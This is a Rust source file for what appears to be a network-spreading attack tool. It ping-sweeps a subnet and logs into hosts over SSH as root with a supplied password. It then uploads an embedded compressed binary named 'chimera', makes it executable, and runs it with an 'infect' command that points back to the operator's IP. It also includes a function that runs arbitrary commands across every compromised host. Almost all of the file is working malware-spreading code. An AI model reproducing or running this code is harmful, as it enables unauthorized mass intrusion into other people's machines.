use crate::net::{
    communicator::{Credentials, Session},
    enumeration::ping::Enumerator,
    ssh::{SSHClient, SSHSession},
    types::{Host, OS},
    winexe::{WinexeClient, WinexeSession},
};
use anyhow::anyhow;
use flate2::read::ZlibDecoder;
use futures::future::join_all;
use local_ip::get_local_ip;
use std::{
    io::{self, Read, Write},
    str,
    sync::Arc,
};
use tokio::{
    fs::File,
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
    time::{timeout, Duration},
};

// Include the bytes of chimera at create::bin::chimera
const CHIMERA: &[u8] = include_bytes!("../../../bin/chimera.zlib");

pub enum SessionType {
    SSH(SSHSession),
    Winexe(WinexeSession),
}

impl SessionType {
    pub async fn close(&self) {
        let _ = match self {
            SessionType::SSH(session) => session.close().await,
            SessionType::Winexe(session) => session.close().await,
        };
    }

    pub async fn execute_command(&self, command: &str) -> anyhow::Result<Option<String>> {
        match self {
            SessionType::SSH(session) => Ok(session.execute_command(command).await?),
            SessionType::Winexe(session) => Ok(session.execute_command(command).await?),
        }
    }
}

pub struct ConnectionPool {
    pub(crate) clients: Vec<Arc<(OS, SessionType)>>,
}

impl ConnectionPool {
    pub async fn new(subnet: &str, password: &str) -> Self {
        let hosts = Enumerator::new(subnet).ping_sweep().await;

        match hosts {
            Ok(hosts) => {
                let clients = Self::scan(&hosts, password).await;
                Self { clients }
            }
            Err(e) => panic!("Error: {}", e),
        }
    }
    async fn scan(hosts: &Vec<Arc<Host>>, password: &str) -> Vec<Arc<(OS, SessionType)>> {
        let mut futures = Vec::new();
        let pass: Arc<String> = Arc::new(password.to_string());

        for host in hosts {
            let shared_pass = pass.clone();
            let host_arc_clone = host.clone();

            let future = async move {
                let task_timeout = Duration::from_secs(15);
                match timeout(
                    task_timeout,
                    establish_connection(host_arc_clone, shared_pass),
                )
                .await
                {
                    Ok(Some(connection)) => Some(connection),
                    Ok(None) | Err(_) => {
                        println!("Connection to {} failed or timed out", host.ip);
                        None
                    }
                }
            };

            futures.push(future);
        }

        let results = join_all(futures).await;

        results.into_iter().filter_map(|result| result).collect()
    }
}

async fn is_ssh_open(ip: &str) -> Result<bool, io::Error> {
    let timeout_duration = Duration::from_secs(5); // Set your desired timeout duration
    let target = format!("{}:22", ip);

    // Apply the timeout to the connection attempt
    let mut stream = timeout(timeout_duration, TcpStream::connect(target)).await??;

    let mut buffer = [0; 1024];
    // Apply the timeout to the read operation
    let bytes_read = timeout(timeout_duration, stream.read(&mut buffer)).await??;

    let banner = str::from_utf8(&buffer[..bytes_read]).unwrap_or_else(|_| "<Invalid UTF-8 data>");

    Ok(banner.contains("OpenSSH"))
}

async fn establish_connection(
    host: Arc<Host>,
    password: Arc<String>,
) -> Option<Arc<(OS, SessionType)>> {
    match host.os {
        OS::Unix => {
            match is_ssh_open(&host.ip).await {
                Ok(is_open) => {
                    if !is_open {
                        return None;
                    }
                }
                Err(_) => return None,
            }

            let creds = Credentials {
                username: "root".into(),
                password: Some(password.to_string()),
                key: None,
            };

            let mut client = SSHClient::new(); // Initialize the client here without 'let'
            client.ip(host.ip.as_str());

            let timeout_duration = Duration::from_secs(15);

            let session = match timeout(timeout_duration, client.connect(&creds)).await {
                Ok(Ok(session)) => {
                    println!("WE GOT A SESSION on ip {}", host.ip);
                    Arc::new((host.os, SessionType::SSH(session)))
                }
                Ok(Err(e)) => {
                    println!("Error on {}: {}", host.ip, e);
                    return None;
                }
                Err(_) => {
                    println!("Connection to {} timed out", host.ip);
                    return None;
                }
            };

            Some(session)
        }
        _ => None,
    }
}

pub struct Spreader {
    pub(crate) pool: ConnectionPool,
    pub(crate) mother_ip: Box<str>,
}

impl Spreader {
    pub async fn new(subnet: &str, password: &str) -> Self {
        let chimera_path = "/tmp/chimera.tmp";
        // Delete the old chimera file if it exists
        tokio::fs::remove_file(chimera_path).await.unwrap_or(());

        // Extract and decompress chimera
        decompress_and_write().await.unwrap();

        Self {
            pool: ConnectionPool::new(subnet, password).await,
            mother_ip: get_local_ip(),
        }
    }

    pub async fn spread(&self) {
        let clients = Arc::new(&self.pool.clients);
        let mut futures = Vec::new();

        for client in clients.iter() {
            let shared_client = client.clone();

            // Create a future for each client and add it to the vector
            let client_future = async move {
                match shared_client.0 {
                    OS::Unix => {
                        match Self::spread_unix(&self.mother_ip, &shared_client.1).await {
                            Ok(_) => println!("Successfully spread"),
                            Err(e) => println!("Error spreading: {}", e),
                        };
                    }
                    _ => {}
                }
            };

            futures.push(client_future);
        }

        // Await all futures concurrently
        join_all(futures).await;
    }

    async fn spread_unix(mother_ip: &str, session: &SessionType) -> anyhow::Result<()> {
        let session = match session {
            SessionType::SSH(session) => session,
            // Throw an error if the session is not SSH
            _ => return Err(anyhow!("Session is not SSH")),
        };

        session
            .transfer_file("/tmp/chimera.tmp", "/tmp/chimera")
            .await?;

        session.execute_command("chmod +x /tmp/chimera").await?;

        let cmd = format!("/tmp/chimera infect -m {} -p 6969", mother_ip);
        session.execute_command(&cmd).await?;

        Ok(())
    }

    // Executes command on all clients of a given session type (SSH or Winexe)
    pub async fn command_spray(&self, session_type: &str, command: &str) {
        let futures = self
            .pool
            .clients
            .iter()
            .filter(|client| match session_type {
                "SSH" => matches!(client.1, SessionType::SSH(_)),
                "WINEXE" => matches!(client.1, SessionType::Winexe(_)),
                _ => panic!("Invalid session type"),
            })
            .map(|client| client.1.execute_command(command))
            .collect::<Vec<_>>();

        join_all(futures).await;
    }

    pub async fn close(&self) {
        let mut futures = Vec::new();

        for client in self.pool.clients.iter() {
            futures.push(client.1.close());
        }

        join_all(futures).await;
    }
}

async fn decompress_and_write() -> anyhow::Result<()> {
    // Decompress CHIMERA
    let mut decoder = ZlibDecoder::new(&CHIMERA[..]);
    let mut decompressed_data = Vec::new();
    decoder.read_to_end(&mut decompressed_data)?;

    // Write to a temporary file
    let mut file = File::create("/tmp/chimera.tmp").await?;
    file.write_all(&decompressed_data).await?;

    Ok(())
}
